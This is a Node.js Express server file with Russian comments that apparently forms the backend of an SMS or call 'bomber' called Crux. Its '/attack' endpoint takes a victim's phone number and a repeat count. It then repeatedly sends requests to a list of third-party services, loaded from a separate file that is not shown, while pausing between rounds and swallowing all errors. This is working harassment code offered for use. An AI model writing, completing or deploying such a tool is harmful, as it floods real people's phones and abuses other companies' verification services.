const express = require('express');
const cors = require('cors');
const axios = require('axios');
const services = require('./services.js');

const app = express();

// Разрешаем запросы с твоего GitHub Pages
app.use(cors());
app.use(express.json());

app.post('/attack', async (req, res) => {
    const { phone, repeats } = req.body;
    console.log(`Запуск на номер: ${phone}, повторов: ${repeats}`);

    // Отвечаем фронтенду сразу, чтобы кнопка не зависала
    res.status(200).json({ status: "started" });

    // Логика атаки
    for (let i = 0; i < repeats; i++) {
        for (const service of services) {
            try {
                const data = typeof service.data === 'function' ? service.data(phone) : service.data;
                await axios({
                    method: service.method,
                    url: service.url,
                    headers: service.headers,
                    data: data,
                    timeout: 4000
                });
            } catch (e) {
                // Игнорируем ошибки сервисов
            }
        }
        // Пауза между кругами 1.5 сек
        await new Promise(r => setTimeout(r, 1500));
    }
});

// ГЛАВНОЕ ДЛЯ RENDER: Порт берем из переменной окружения
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер Crux ONLINE на порту ${PORT}`);
});
